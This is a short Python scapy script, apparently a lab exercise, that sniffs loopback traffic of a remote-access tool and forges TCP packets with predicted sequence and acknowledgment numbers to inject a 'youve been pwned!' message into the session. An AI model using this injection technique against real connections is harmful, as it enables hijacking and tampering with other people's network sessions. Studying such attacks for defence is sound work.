import scapy.layers.l2
from scapy.all import sniff, send, raw
from scapy.layers.inet import IP, TCP, ICMP
import dataclasses
import struct
from time import sleep

class RATStream:
    admin_port: int = -1
    remote_system_port: int = -1
    most_recent_remote_ack: int = -1
    most_recent_remote_seq: int = -1
    most_recent_ip_id: int = -1
    template_packet = None

    def poison_and_send(self):
        new_packet = self.template_packet.copy()

        new_packet[IP].id = self.most_recent_ip_id + 1
        new_packet[IP].chksum = None

        tcp_layer = new_packet[TCP]
        tcp_layer.ack = ratstream.most_recent_remote_seq
        tcp_layer.seq = ratstream.most_recent_remote_ack
        tcp_layer.chksum = None

        new_packet[TCP].payload.load = struct.pack("I 2044s", 1, 'youve been pwned!'.encode())

        send(new_packet[IP], iface='\\Device\\NPF_Loopback')

def decode_message_packet(packet):
    return packet[TCP].payload.load[4:].decode('utf-8', errors='ignore').rstrip('\x00')

waiting_for_ack = False
ratstream = RATStream()
def process_packet(packet: scapy.layers.l2.Loopback):
    global waiting_for_ack, ratstream


    if packet.haslayer(TCP):
        if len(packet[TCP].payload) == 2048:
            message = decode_message_packet(packet)

            if message == "trigger":
                ratstream.admin_port = packet[TCP].sport
                ratstream.remote_system_port = packet[TCP].dport
                ratstream.template_packet = packet
                waiting_for_ack = True

        if packet[TCP].sport == ratstream.remote_system_port:
            ratstream.most_recent_remote_ack = packet[TCP].ack
            ratstream.most_recent_remote_seq = packet[TCP].seq
            ratstream.most_recent_ip_id = packet[IP].id

            if waiting_for_ack:
                ratstream.poison_and_send()
                waiting_for_ack = False

print("Sniffing and detecting RAT packets...")
sniff(iface="\\Device\\NPF_Loopback", prn=process_packet)